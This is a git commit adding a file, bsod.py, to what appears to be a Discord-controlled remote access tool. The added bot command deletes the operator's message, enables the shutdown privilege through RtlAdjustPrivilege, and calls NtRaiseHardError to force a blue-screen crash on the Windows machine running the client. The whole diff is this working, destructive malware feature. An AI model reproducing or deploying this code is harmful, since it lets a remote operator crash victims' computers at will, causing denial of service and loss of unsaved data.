9eb116ea351e28bfd10a692b3cb37d92ded59557
JuicyChann <nik.xeiladakis@gmail.com>
2023-11-26 13:34:40 +0200

    add bsod.py

---
+++ resources/features/bsod.py
@@ -0,0 +1,22 @@
+import ctypes
+# end of imports
+@client.command(name="bsod")
+async def bluescreen_trigger(ctx): 
+    await ctx.message.delete()
+    await ctx.send("```Triggering a BSoD...```")
+    
+    nullptr = ctypes.POINTER(ctypes.c_int)()
+    ctypes.windll.ntdll.RtlAdjustPrivilege(
+        ctypes.c_uint(19), 
+        ctypes.c_uint(1), 
+        ctypes.c_uint(0), 
+        ctypes.byref(ctypes.c_int())
+    )
+    ctypes.windll.ntdll.NtRaiseHardError(
+        ctypes.c_ulong(0xC000007B), 
+        ctypes.c_ulong(0), 
+        nullptr, 
+        nullptr, 
+        ctypes.c_uint(6),
+        ctypes.byref(ctypes.c_uint())
+    )
